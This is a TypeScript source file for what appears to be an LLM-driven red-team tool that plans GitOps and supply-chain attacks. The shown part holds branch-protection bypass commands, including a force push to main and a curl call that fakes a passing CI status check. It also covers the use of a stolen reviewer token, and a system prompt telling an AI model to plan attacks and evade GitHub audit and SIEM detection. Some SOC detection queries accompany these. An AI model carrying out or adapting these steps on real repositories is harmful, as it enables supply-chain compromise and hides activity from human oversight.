        command: "# Method 1: Admin direct push (if enforce_admins is false)\ngit push origin main --force\n\n# Method 2: Create passing status check (if we control a CI app)\ncurl -X POST -H \"Authorization: token $GITHUB_TOKEN\" \\\n  https://api.github.com/repos/{owner}/{repo}/statuses/{commit_sha} \\\n  -d '{\"state\": \"success\", \"context\": \"ci/required-check\", \"description\": \"All checks passed\"}'\n\n# Method 3: CODEOWNERS gap exploitation\n# If CODEOWNERS has: * @security-team\n# But doesn't cover: .github/workflows/ or scripts/\n# Push to uncovered paths that still affect deployment",
        expectedOutput: "Direct push to protected branch succeeds, or PR auto-merges after status check manipulation.",
        riskWarning: "Admin bypass generates GitHub audit event 'protected_branch.policy_override'. This is a high-severity alert in most SOCs.",
        automated: false,
      },
    ],
    evasionTechniques: [
      {
        id: "ev-branch-01",
        name: "Legitimate Reviewer Compromise",
        description: "Instead of bypassing protection, compromise a legitimate reviewer's account to approve the PR normally.",
        targetDetection: "Branch protection bypass alerts (bypassed)",
        implementation: "Use stolen PAT or session token from a CODEOWNER to approve the PR. The merge looks completely legitimate.",
        effectiveness: "high",
        tradeoff: "Requires compromising a reviewer's credentials first",
      },
    ],
    detectionSignatures: [
      {
        source: "github_audit",
        ruleName: "Branch Protection Override",
        description: "GitHub audit log captures admin overrides of branch protection.",
        query: "index=github_audit action='protected_branch.policy_override' OR action='protected_branch.force_push' | table timestamp, actor, repo, branch",
        severity: "critical",
        falsePositiveRate: "low",
        timeWindow: "Real-time",
      },
      {
        source: "github_audit",
        ruleName: "Status Check Created by Unexpected Actor",
        description: "GitHub audit log shows status check creation. Alert when checks come from unexpected GitHub Apps or users.",
        query: "index=github_audit action='status.create' actor NOT IN (known_ci_apps) | table timestamp, actor, repo, context, state",
        severity: "high",
        falsePositiveRate: "low",
        timeWindow: "Real-time",
      },
    ],
    evidenceArtifacts: [
      "Branch protection configuration before bypass",
      "Git log showing direct push to protected branch",
      "GitHub audit log entry for policy override",
      "CODEOWNERS file analysis showing gaps",
    ],
  },
];

// ═══════════════════════════════════════════════════════════════════════════════
// §3 — LLM SYSTEM PROMPT
// ═══════════════════════════════════════════════════════════════════════════════

const GITOPS_OFFENSIVE_SYSTEM_PROMPT = `You are the AC3 GitOps/Supply Chain Offensive Engine — an expert-level CI/CD security attack planner and operator guide.

You have deep expertise in:
- ArgoCD architecture (application controller, repo server, API server, RBAC)
- Atlantis Terraform automation (webhooks, plan/apply flow, server-side execution)
- GitHub Enterprise Cloud (Actions, branch protection, CODEOWNERS, audit log, Apps)
- Container registries (ECR, GHCR, image signing with Cosign/Sigstore)
- Terraform security (state file secrets, provider plugins, provisioner abuse)
- GitOps deployment patterns (Kustomize, Helm, plain manifests)
- Supply chain attack vectors (dependency confusion, typosquatting, pipeline injection)
- Code signing and verification bypass techniques

Your role is to:
1. Analyze the CI/CD infrastructure and identify supply chain attack paths
2. Select the optimal technique based on current access and deployment pipeline
3. Generate detailed operator guidance with exact git/CLI commands and expected outputs
4. Plan evasion against GitHub audit logs, ArgoCD monitoring, and SIEM correlation
5. Produce structured evidence records for the engagement's tamper-evident audit trail
6. Map every action to SOC-detectable indicators (audit events, CloudTrail, SIEM rules)

CRITICAL RULES:
- ALWAYS verify that changes won't break production before pushing (test in non-prod first)
- ALWAYS use legitimate-looking commit messages and branch names
- NEVER push to production branches without explicit ROE authorization
- ALWAYS include cleanup procedures (revert commits, delete branches, restore images)
- When human intervention is required, provide EXACT git/CLI commands with explanations
- Include GitHub audit event names and CloudTrail event names for EVERY action

AVAILABLE TECHNIQUES:
${GITOPS_TECHNIQUES.map(t => "- " + t.name + " (" + t.attackId + "): " + t.description + " | Difficulty: " + t.difficulty + " | OPSEC: " + t.opsecRisk + "/10").join("\n")}

EVASION PRIORITIES FOR FEDRAMP GOVCLOUD CI/CD:
1. Use legitimate commit patterns (conventional commits, small diffs)
2. Time pushes during normal development hours
3. Avoid triggering branch protection alerts
4. Use plan-time execution (external data sources) to bypass apply gates
5. Minimize CloudTrail footprint from CI/CD IAM roles
6. Clean up ephemeral branches and workflow files after execution

OUTPUT FORMAT (JSON):
{
  "selectedTechnique": { "id": string, "name": string, "reasoning": string },
  "attackPlan": {
    "phases": [{ "phase": string, "steps": string[], "automated": boolean, "operatorRequired": boolean }],
    "estimatedDuration": string,
    "currentAccess": string,
    "targetAccess": string
  },
  "operatorInstructions": [{ "step": number, "action": string, "command": string, "expectedOutput": string, "decisionPoint": string | null, "riskWarning": string | null }],
  "evasionPlan": { "primaryEvasion": string[], "detectionRulesAtRisk": string[], "timingConstraints": string[], "cleanupRequired": string[] },
  "evidenceCollection": [{ "artifact": string, "collectionMethod": string, "storageNote": string }],
  "socCorrelation": [{ "logSource": string, "ruleName": string, "searchQuery": string, "expectedTimestamp": string, "description": string }],
  "confidence": number,
  "overallRisk": number
}`;

// ═══════════════════════════════════════════════════════════════════════════════
// §4 — CORE ENGINE FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════════

export async function planGitOpsAttack(
  target: GitOpsTargetConfig,
  context: GitOpsAttackContext
): Promise<GitOpsAttackPlan> {
  try {
    return await llmPlanGitOpsAttack(target, context);
  } catch (err) {
    console.warn("[GitOpsOffensive] LLM unavailable, using deterministic fallback:", (err as Error).message);
    return deterministicPlanGitOpsAttack(target, context);
  }
}

async function llmPlanGitOpsAttack(
  target: GitOpsTargetConfig,
  context: GitOpsAttackContext
): Promise<GitOpsAttackPlan> {
  const { invokeLLM } = await import("../_core/llm");

  const response = await invokeLLM({
    _caller: "gitops-offensive-engine.planGitOpsAttack",
    messages: [
      { role: "system", content: GITOPS_OFFENSIVE_SYSTEM_PROMPT },
      {
        role: "user",
        content: `PLAN GITOPS/SUPPLY CHAIN ATTACK:

TARGET INFRASTRUCTURE:
- Git Provider: ${target.gitProvider} | CI/CD: ${target.cicdPlatform}
- Container Registry: ${target.containerRegistry} | Terraform Backend: ${target.terraformBackend || "none"}
- Image Signing: ${target.imageSigningEnabled} | Branch Protection: ${target.branchProtectionEnabled}
- CODEOWNERS: ${target.codeOwnersEnabled} | Environment: ${target.deploymentEnvironment}

CURRENT ACCESS:
- Level: ${context.currentAccess.level}
- Repositories: ${context.currentAccess.repositories?.join(", ") || "unknown"}
- ArgoCD: ${context.currentAccess.argocdAccess || "none"}
- Atlantis: ${context.currentAccess.atlantisAccess || "none"}
- Registry: ${context.currentAccess.registryAccess || "none"}
TARGET: ${context.targetAccess}

DETECTION: GitHub Audit=${context.detectionEnvironment.githubAuditLogEnabled} | ArgoCD Audit=${context.detectionEnvironment.argocdAuditEnabled} | Branch Alerts=${context.detectionEnvironment.branchProtectionAlerts} | Secret Scanning=${context.detectionEnvironment.secretScanningEnabled} | SIEM=${context.detectionEnvironment.siemIntegration}

CONSTRAINTS: MaxRisk=${context.constraints?.maxOpsecRisk || "none"} | Silent=${context.constraints?.preferSilent || false}

Select optimal supply chain technique with full operator guidance, evasion plan, evidence collection, and SOC correlation.`,
      },
    ],
    response_format: {
      type: "json_schema",
      json_schema: {
        name: "gitops_attack_plan",
        strict: true,
        schema: {
          type: "object",
          properties: {
            selectedTechnique: { type: "object", properties: { id: { type: "string" }, name: { type: "string" }, reasoning: { type: "string" } }, required: ["id", "name", "reasoning"], additionalProperties: false },
            attackPlan: { type: "object", properties: { phases: { type: "array", items: { type: "object", properties: { phase: { type: "string" }, steps: { type: "array", items: { type: "string" } }, automated: { type: "boolean" }, operatorRequired: { type: "boolean" } }, required: ["phase", "steps", "automated", "operatorRequired"], additionalProperties: false } }, estimatedDuration: { type: "string" }, currentAccess: { type: "string" }, targetAccess: { type: "string" } }, required: ["phases", "estimatedDuration", "currentAccess", "targetAccess"], additionalProperties: false },
            operatorInstructions: { type: "array", items: { type: "object", properties: { step: { type: "number" }, action: { type: "string" }, command: { type: "string" }, expectedOutput: { type: "string" }, decisionPoint: { type: ["string", "null"] }, riskWarning: { type: ["string", "null"] } }, required: ["step", "action", "command", "expectedOutput", "decisionPoint", "riskWarning"], additionalProperties: false } },
            evasionPlan: { type: "object", properties: { primaryEvasion: { type: "array", items: { type: "string" } }, detectionRulesAtRisk: { type: "array", items: { type: "string" } }, timingConstraints: { type: "array", items: { type: "string" } }, cleanupRequired: { type: "array", items: { type: "string" } } }, required: ["primaryEvasion", "detectionRulesAtRisk", "timingConstraints", "cleanupRequired"], additionalProperties: false },
            evidenceCollection: { type: "array", items: { type: "object", properties: { artifact: { type: "string" }, collectionMethod: { type: "string" }, storageNote: { type: "string" } }, required: ["artifact", "collectionMethod", "storageNote"], additionalProperties: false } },
            socCorrelation: { type: "array", items: { type: "object", properties: { logSource: { type: "string" }, ruleName: { type: "string" }, searchQuery: { type: "string" }, expectedTimestamp: { type: "string" }, description: { type: "string" } }, required: ["logSource", "ruleName", "searchQuery", "expectedTimestamp", "description"], additionalProperties: false } },
            confidence: { type: "number" },
            overallRisk: { type: "number" },
          },
          required: ["selectedTechnique", "attackPlan", "operatorInstructions", "evasionPlan", "evidenceCollection", "socCorrelation", "confidence", "overallRisk"],
          additionalProperties: false,
        },
      },
    },
  });

  return JSON.parse(response.choices[0].message.content as string);
}

function deterministicPlanGitOpsAttack(target: GitOpsTargetConfig, context: GitOpsAttackContext): GitOpsAttackPlan {
  let technique: GitOpsTechnique;

  if (context.currentAccess.atlantisAccess === "apply" || context.currentAccess.atlantisAccess === "plan_only") {
    technique = GITOPS_TECHNIQUES.find(t => t.id === "gitops-atlantis-01")!;
  } else if (context.currentAccess.registryAccess === "push" || context.currentAccess.registryAccess === "admin") {
    technique = GITOPS_TECHNIQUES.find(t => t.id === "gitops-registry-01")!;
  } else if (context.currentAccess.argocdAccess === "project_admin" || context.currentAccess.argocdAccess === "cluster_admin") {
    technique = GITOPS_TECHNIQUES.find(t => t.id === "gitops-pipeline-01")!;
  } else if (context.currentAccess.level === "contributor" || context.currentAccess.level === "maintainer") {
    technique = GITOPS_TECHNIQUES.find(t => t.id === "gitops-secrets-01")!;
  } else {
    technique = GITOPS_TECHNIQUES.find(t => t.id === "gitops-branch-01")!;
  }

  return {
    selectedTechnique: { id: technique.id, name: technique.name, reasoning: `Selected for access level ${context.currentAccess.level}. OPSEC: ${technique.opsecRisk}/10.` },
    attackPlan: {
      phases: technique.operatorGuidance.map((og, i) => ({ phase: `Step ${i + 1}: ${og.action}`, steps: [og.command.split("\n")[0]], automated: og.automated, operatorRequired: !og.automated })),
      estimatedDuration: "2-4 hours", currentAccess: context.currentAccess.level, targetAccess: context.targetAccess,
    },
    operatorInstructions: technique.operatorGuidance.map(og => ({ step: og.stepNumber, action: og.action, command: og.command, expectedOutput: og.expectedOutput || "Varies", decisionPoint: og.decisionPoint || null, riskWarning: og.riskWarning || null })),
    evasionPlan: {
      primaryEvasion: technique.evasionTechniques.map(e => `${e.name}: ${e.description}`),
      detectionRulesAtRisk: technique.detectionSignatures.map(d => d.ruleName),
      timingConstraints: ["Execute during normal development hours", "Use conventional commit messages", "Space operations 5-10 minutes apart"],
      cleanupRequired: ["Revert malicious commits", "Delete ephemeral branches", "Restore original images", "Remove modified workflows"],
    },
    evidenceCollection: technique.evidenceArtifacts.map(a => ({ artifact: a, collectionMethod: "Manual capture", storageNote: "SHA-256 integrity hash in evidence chain" })),
    socCorrelation: technique.detectionSignatures.map(d => ({ logSource: d.source, ruleName: d.ruleName, searchQuery: d.query, expectedTimestamp: d.timeWindow, description: d.description })),
    confidence: 0.7, overallRisk: technique.opsecRisk,
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// §5 — EVIDENCE & SOC INTEGRATION
// ═══════════════════════════════════════════════════════════════════════════════

export function createGitOpsEvidenceRecord(techniqueId: string, action: string, result: { success: boolean; sourceContext: string; targetResource: string; repository?: string; commandExecuted?: string; rawOutput?: string; impactAchieved?: string; operatorNotes?: string }): GitOpsEvidenceRecord {
  const technique = GITOPS_TECHNIQUES.find(t => t.id === techniqueId);
  return {
    techniqueId, techniqueName: technique?.name || "Unknown", mitreTechnique: technique?.attackId || "T1195",
    timestamp: Date.now(), sourceContext: result.sourceContext, targetResource: result.targetResource,
    repository: result.repository, actionPerformed: action, commandExecuted: result.commandExecuted,
    rawOutput: result.rawOutput, artifactsCollected: technique?.evidenceArtifacts || [],
    detectionCorrelation: (technique?.detectionSignatures || []).map(d => ({ logSource: d.source, ruleName: d.ruleName, expectedTimestamp: `Within ${d.timeWindow}`, searchQuery: d.query, description: d.description })),
    operatorNotes: result.operatorNotes, success: result.success, impactAchieved: result.impactAchieved,
  };
}

export function generateGitOpsSOCPlaybook(records: GitOpsEvidenceRecord[]) {
  return records.map(r => ({
    title: `Detect: ${r.techniqueName} (${r.mitreTechnique})`,
    description: `Supply chain activity at ${new Date(r.timestamp).toISOString()} targeting '${r.targetResource}'${r.repository ? ` in repo '${r.repository}'` : ""}.`,
    queries: r.detectionCorrelation.map(dc => ({ source: dc.logSource, query: dc.searchQuery, timeRange: dc.expectedTimestamp, expectedResults: dc.description })),
  }));
}

export { GITOPS_OFFENSIVE_SYSTEM_PROMPT };
